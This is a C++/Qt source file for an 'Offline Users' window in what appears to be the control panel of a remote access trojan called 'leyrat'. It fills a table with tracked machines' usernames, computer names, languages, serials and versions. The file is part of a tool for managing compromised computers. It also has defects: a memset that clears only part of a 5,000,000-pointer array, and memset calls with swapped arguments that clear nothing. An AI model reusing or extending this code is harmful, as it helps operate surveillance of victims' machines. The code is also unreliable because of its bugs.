#include "offlineusers.h"
#include "ui_offlineusers.h"

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "leyrat.h"


extern Ui::MainWindow *mainwin;
extern leyrat rat;

int numofflineusers = 0;
offlineuser**offlineusers = 0;
Offlineusers *offlineuserwin;

Offlineusers::Offlineusers(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Offlineusers)
{
    ui->setupUi(this);
    this->setWindowTitle("Offline Users");
    ui->tableWidget->setEditTriggers(ui->tableWidget->NoEditTriggers);
    ui->tableWidget->verticalHeader()->hide();
    ui->tableWidget->setSelectionBehavior(ui->tableWidget->SelectRows);
    ui->pushButton->setFocusPolicy(Qt::NoFocus);
    this->setWindowFlags(windowFlags() & ~Qt::WindowContextHelpButtonHint | Qt::MSWindowsFixedSizeDialogHint);

    Refresh();
    offlineuserwin = this;

}

Offlineusers::~Offlineusers()
{
    delete ui;
}

void Offlineusers::Refresh()
{
    if(!offlineusers)
    {
        offlineusers = new offlineuser*[5000000];
        memset(offlineusers, 0, 5000000);
    }

    for(int i=0;i<numofflineusers+1;i++)
    {
        if(offlineusers[i])
        {
            delete[] offlineusers[i];
            offlineusers[i] = 0;
        }
    }


    numofflineusers = rat.GetOfflineUsers(offlineusers, 5000000);
    this->ui->tableWidget->setRowCount(numofflineusers);

    for(int i=0;i<numofflineusers;i++)
    {
        if(!offlineusers[i]) continue;
        offlineuser *user = offlineusers[i];

        char sversion[20];
        char sserial[20];
        memset(sversion, 6, 0);
        memset(sserial, 6, 0);

        sprintf(sversion,"%i",user->version);
        sprintf(sserial,"%i",user->serial);

        this->ui->tableWidget->setItem(i, 0, new QTableWidgetItem(sversion));
        this->ui->tableWidget->setItem(i, 1, new QTableWidgetItem(sserial));
        this->ui->tableWidget->setItem(i, 2, new QTableWidgetItem(user->language));
        this->ui->tableWidget->setItem(i, 3, new QTableWidgetItem(user->username));
        this->ui->tableWidget->setItem(i, 4, new QTableWidgetItem(user->computername));

    }
}

void Offlineusers::on_pushButton_pressed()
{
    Refresh();
}
